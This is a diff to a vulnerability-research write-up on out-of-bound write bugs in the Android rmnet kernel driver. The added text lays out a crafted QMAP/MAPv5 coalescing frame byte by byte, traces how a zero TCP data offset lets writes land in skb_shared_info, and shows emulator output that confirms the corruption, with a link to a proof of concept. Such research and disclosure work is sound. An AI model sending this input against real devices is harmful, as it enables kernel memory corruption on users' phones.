@@ -137,6 +137,84 @@ If you are familiar with vulnerability research the two bug should be straightfo
 
 *Final Outcome*: Well, the primitive would be so neat if we could just reach the memcpy and corrupt the heap memory but unfortunately the `skb_put` will very likely crash because `old_tail + len >  end` which will cause a BUG() and a crash...
 
+To trigger an actual out-of-bound write we need to find another path, that's why I started looking into the *coalescing* path in `_rmnet_map_ingress_handler`, especially `rmnet_map_process_next_hdr_packet`. The root-cause analysis is quite long so I will start from a given buggy input:
+```
+ offset          bytes (hex)          field / meaning
+ ------          -----------          ----------------------------------------
+ 0x0000          40                   QMAP: next_hdr=1, cd_bit=0, pad_len=0
+ 0x0001          42                   mux_id=0x42
+ 0x0002          0E F0                QMAP pkt_len=3824 (frame size minus 4)
+
+ 0x0004          02                   MAPv5 header type=COALESCING
+ 0x0005          10                   num_nlos=1, csum_valid=0
+ 0x0006          00                   close_type=0 (avoids reuse shortcut)
+ 0x0007          00                   virtual_channel_id=0
+ 0x0008          0E C0                NLO pkt_len=3776
+ 0x000A          01                   checksum-error bit for packet 0
+ 0x000B          01                   num_packets=1
+ 0x000C..0x001F  00 x 20              remaining NLO entries
+
+ 0x0020          60 00 00 00          IPv6 version=6
+ 0x0024          0E AC                IPv6 payload_len=3756
+ 0x0026          00                   next header=Hop-by-Hop (not TCP)
+ 0x0027          40                   hop limit=64
+ 0x0028..0x0047  00 x 32              IPv6 source and destination addresses
+
+ 0x0048          3C FF                Hop-by-Hop: next=Destination Options,
+                                      length=(255+1)*8=2048
+ 0x004A..0x0847  00 x 2046            Pad1 option bytes
+
+ 0x0848          06 D2                Destination Options: next=TCP,
+                                      length=(210+1)*8=1688
+ 0x084A..0x0EDF  00 x 1686            Pad1 option bytes
+
+ 0x0EE0..0x0EF3  00 x 20              TCP bytes; doff at 0x0EEC is 00
+ 0x0EF4                               end of frame (3828 bytes total)
+```
+
+The code flow with this input in `rmnet_map_process_next_hdr_packet` and `__rmnet_map_segment_coal_skb` from will be:
+```c
+// rmnet_map_process_next_hdr_packet
+coal = skb->data + 4;
+if (coal->header_type != COALESCING || coal->num_nlos != 1)
+    return -EINVAL;
+
+skb_pull(skb, 4 + 28);                 // skb->data = frame offset 0x0020
+
+ip_len = ipv6_skip_exthdr(skb, 40, ...);
+// 40 + ((0xFF + 1) * 8) + ((0xD2 + 1) * 8) = 3776
+// TCP is at frame offset 0x0020 + 3776 = 0x0EE0
+
+tcp = skb->data + ip_len;
+tcp_len = tcp->doff * 4;              // byte 0x0EEC = 0 -> tcp_len=0
+seg_len = ntohs(coal->nl_pairs[0].pkt_len) - ip_len - tcp_len;
+//        3776                              - 3776   - 0 = 0
+
+// Extension headers disable GRO reuse; close_type=0 avoids the other shortcut.
+__rmnet_map_segment_coal_skb(skb, ip_len, tcp_len, seg_len,
+                             pkt_count=1, csum_valid=false);
+
+// __rmnet_map_segment_coal_skb
+dlen = pkt_count * seg_len;            // 0
+hlen = ip_len + tcp_len;               // 3776
+skbn = alloc_skb(hlen + dlen);         // 3776 data bytes; skb->end=3776
+
+skb_reserve(skbn, hlen);               // data = head + 3776
+skb_put(skbn, dlen);                   // put 0
+skb_push(skbn, tcp_len);               // push 0
+th = tcp_hdr(skbn);                    // th = skb_shared_info
+
+th->seq = ...;                         // store at skb_shared_info + 4
+check = &th->check;                    // points to skb_shared_info + 16
+
+skb_push(skbn, ip_len);                // push IPv6 and extension headers
+memcpy(skbn->data, ip, ip_len);
+*check = pseudo_checksum;              // store at +16
+*check = corrupted_checksum;           // second store at +16
+```
+
+The missing `doff >= 5` check in `rmnet_map_process_next_hdr_packet` and the zero segment length lets `__rmnet_map_segment_coal_skb` write TCP fields despite reserving zero TCP bytes which end up overwriting the `skb_shared_info` fields. In terms of flags requirements this code path requires `RMNET_FLAGS_INGRESS_COALESCE` or `RMNET_PRIV_FLAGS_INGRESS_MAP_CKSUMV5` and requires a linear skb (which is the default).
+
 # What's up from the public available source?
 
 From the LineageOS driver the `skb_put`, `memcpy` and `skb_push` is just.. missing:
@@ -167,6 +245,8 @@ static void rmnet_frag_send_ack(struct rmnet_map_header *qmap,
 ```
 
 Because the skb contains the content of the map command packets already (parsed by the IPA driver) the driver don't need to copy the content of the map commands again, it can just write the command which gets aknowledged and that's it (but I am not sure yet if somone more experienced could clarify that).
+
+For the `rmnet_map_process_next_hdr_packet` oob write the code is actually almost the same (a few functions are inlined in the .ko) so I bet this bug does not only affect HyperOS.
 
 # Emulation
 
@@ -199,21 +279,18 @@ def _code_hook(self, uc, address, size, _):
     getattr(self, name)()
 ```
 
+One limitation is that for the `rmnet_map_process_next_hdr_packet` case, `ipv6_skip_exthdr` is emulated in `_cb_ipv6_skip_exthdr`, i tried to vibe-code a rather realistic version, and the input tested in the poc passes it.
+
+Otherwise every input is tested from the `rmnet_rx_handler`. So that should reliable enough *maybe*.
+
 Which finally gives:
 
 ```
-$ ./run.sh
+$ ./run.sh 
 baseline
 __alloc_skb(size=80, gfp=0x820, flags=0x0, node=-1)
 skb_put(skb=0x80007000, len=16)
 memcpy(dst=0x80008020, src=0xff0fffd000000004, n=16)
-skb_push(skb=0x80007000, len=4)
-consume_skb(skb=0x80005000)
-
-double-fetch
-__alloc_skb(size=80, gfp=0x820, flags=0x0, node=-1)
-skb_put(skb=0x80007000, len=16)
-memcpy(dst=0x80008020, src=0xff0fffd000000004, n=600)
 skb_push(skb=0x80007000, len=4)
 consume_skb(skb=0x80005000)
 
@@ -223,6 +300,19 @@ skb_put(skb=0x80007000, len=65535)
 memcpy(dst=0x80008020, src=0xff0fffd000000004, n=65535)
 skb_push(skb=0x80007000, len=4)
 consume_skb(skb=0x80005000)
+
+coalesce-shinfo
+__alloc_skb(size=3776, gfp=0x820, flags=0x0, node=-1)
+skb_put(skb=0x80007000, len=0)
+memcpy(dst=0x80008e80, src=0x80014ee0, n=0)
+skb_push(skb=0x80007000, len=0)
+memcpy(dst=0x80008ec0, src=0x80014ee0, n=0)
+tcp_seq store @ 0x80008ec4 -> shinfo+0x4 (delta=4, width=4, value=0x0)
+skb_push(skb=0x80007000, len=3776)
+memcpy(dst=0x80008000, src=0x80014020, n=3776)
+tcp_csum store @ 0x80008ed0 -> shinfo+0x10 (delta=16, width=2, value=0xffff)
+tcp_csum store @ 0x80008ed0 -> shinfo+0x10 (delta=16, width=2, value=0x100)
+OK: tcp_seq@+4 tcp_csum@+16 tcp_csum@+16 inside skb_shared_info; object kmalloc-4096, gso_size=0 gso_segs=0x0 hwtstamp.lo=0x100
 ```
 
 Full code of the poc: [here](https://gist.github.com/n4sm/49468d9cfc2215b8d27b23c2fdda19f0).
